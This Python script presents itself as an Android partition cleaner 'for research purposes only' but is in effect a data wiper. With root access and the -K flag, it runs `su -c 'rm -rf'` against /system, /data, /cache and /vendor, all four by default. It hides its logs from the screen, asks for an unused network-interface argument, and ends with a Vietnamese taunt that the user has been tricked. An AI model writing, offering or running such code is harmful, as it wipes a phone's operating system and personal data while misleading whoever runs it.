#!/usr/bin/env python3
import argparse
import os
import sys
import time
import random
import logging
from typing import List

# Configure logging to write only to file, not to stdout
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('clean.log')
    ]
)
logger = logging.getLogger(__name__)

def matrix_rain(columns: int = 20, duration: float = 1.0) -> None:
    """Simulate Matrix-style digital rain effect."""
    rows = 30  # Number of rows to simulate
    matrix = [[" " for _ in range(columns)] for _ in range(rows)]

    start_time = time.time()
    while time.time() - start_time < duration:
        # Clear the current line
        sys.stdout.write("\033[2J\033[H")  # Clear screen and move cursor to top
        for i in range(rows):
            for j in range(columns):
                if random.random() < 0.3:  # 30% chance to update a character
                    matrix[i][j] = random.choice("01")
                sys.stdout.write(matrix[i][j] + " ")
            sys.stdout.write("\n")
        sys.stdout.flush()
        time.sleep(0.1)  # Control speed of rain

    # Clear screen after effect
    sys.stdout.write("\033[2J\033[H")

def print_large_message(message: str) -> None:
    """Print message in large ASCII-like format."""
    for char in message:
        for _ in range(3):  # Repeat each char vertically
            sys.stdout.write(char * 3 + " ")  # Repeat each char horizontally
        sys.stdout.write("\n")
    sys.stdout.write("\n")

def is_root() -> bool:
    """Check if the script is running with root privileges."""
    return os.geteuid() == 0

def display_partitions_info() -> None:
    """Display information about Android partitions."""
    logger.info("🔍 Displaying partition information:")
    partitions = {
        "/system": "Contains Android OS core files",
        "/data": "Stores user data and applications",
        "/cache": "Stores system cache",
        "/vendor": "Contains manufacturer-specific files"
    }
    for path, desc in partitions.items():
        logger.info(f"- {path}: {desc}")

def execute_cleaning(partitions: List[str]) -> None:
    """Execute cleaning of specified partitions using su."""
    if not is_root():
        logger.error("❌ Root privileges required to execute this command!")
        sys.exit(1)

    logger.info("🚨 Starting partition cleaning process...")
    for partition in partitions:
        if not os.path.exists(partition):
            logger.warning(f"⚠️ Partition {partition} does not exist, skipping...")
            continue

        logger.info(f"[+] Cleaning partition {partition}...")
        try:
            os.system(f"su -c 'rm -rf {partition}/*' || true")
            logger.info(f"[✅] Successfully cleaned {partition}")
        except Exception as e:
            logger.error(f"[❌] Failed to clean {partition}: {str(e)}")

    logger.info("[✅] Cleaning completed.")

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Android Partition Cleaner - For research purposes only",
        epilog="Use with caution on test devices only!"
    )
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., wlan0)")
    parser.add_argument("-K", "--confirm", action="store_true", help="Confirm execution of cleaning")
    parser.add_argument("-s", "--system", action="store_true", help="Clean /system partition")
    parser.add_argument("-d", "--data", action="store_true", help="Clean /data partition")
    parser.add_argument("-c", "--cache", action="store_true", help="Clean /cache partition")
    parser.add_argument("-v", "--vendor", action="store_true", help="Clean /vendor partition")

    args = parser.parse_args()

    if not args.confirm:
        display_partitions_info()
        logger.info("No cleaning initiated. Use -K to proceed with cleaning.")
        matrix_rain()
        print_large_message("Bạn đã bị lừa, đừng cài những thứ mà mình không biết rõ")
        sys.exit(0)

    partitions = []
    if args.system:
        partitions.append("/system")
    if args.data:
        partitions.append("/data")
    if args.cache:
        partitions.append("/cache")
    if args.vendor:
        partitions.append("/vendor")

    if not partitions:
        partitions = ["/system", "/data", "/cache", "/vendor"]

    matrix_rain(duration=2.0)  # Longer effect when cleaning
    execute_cleaning(partitions)
    print_large_message("Bạn đã bị lừa, đừng cài những thứ mà mình không biết rõ")

if __name__ == "__main__":
    main()